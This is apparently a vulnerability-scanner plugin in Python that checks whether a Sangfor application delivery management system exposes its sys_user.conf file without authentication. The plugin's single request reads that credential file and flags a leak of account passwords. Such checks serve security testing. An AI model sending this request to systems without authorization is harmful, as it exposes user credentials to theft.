# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "深信服 应用交付管理系统 sys_user.conf 账号密码泄漏漏洞",
        "description": "深信服 应用交付管理系统 文件sys_user.conf可在未授权的情况下直接访问，导致账号密码泄漏",
        "references": ["-"],
    }

    def url(self) -> dict:
        r = self.request(
            method='GET',
            path='./tmp/updateme/sinfor/ad/sys/sys_user.conf',
            timeout=15
        )
        if "账号密码" in r.text:
            return {"LoopholeInfo": self.__info__}
